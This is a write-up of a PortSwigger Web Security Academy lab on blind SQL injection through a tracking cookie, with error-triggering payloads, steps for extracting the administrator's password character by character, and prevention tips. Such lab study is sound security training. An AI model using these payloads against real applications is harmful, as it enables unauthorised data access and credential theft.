SQL Injection: Blind SQLi with Conditional Errors

Category: SQL Injection
Difficulty: Practitioner
Lab Link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

---

Vulnerability

The application is vulnerable to blind SQL injection via a tracking cookie.
The application does not return query results, but it displays an error message when a query fails.

---

Payloads

Trigger error condition:

' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--

Extract password (example):

' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--

---

Exploitation Steps

1. Intercept the request using Burp Suite.

2. Locate the tracking cookie ("TrackingId").

3. Test error-based condition:

TrackingId=xyz' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--

→ Application shows error message

4. Test false condition:

TrackingId=xyz' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--

→ No error

5. Extract password character by character:

SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a'

6. Repeat for each character until full password is obtained.

7. Log in as administrator.

---

Why the Attack Works

- The application reveals information through error messages
- "CASE WHEN" controls whether an error is triggered
- Division by zero ("1/0") causes a database error

This allows extraction of data based on error vs no error behavior.

---

Prevention

- Use parameterized queries
- Avoid using user input in SQL queries directly
- Implement proper input validation
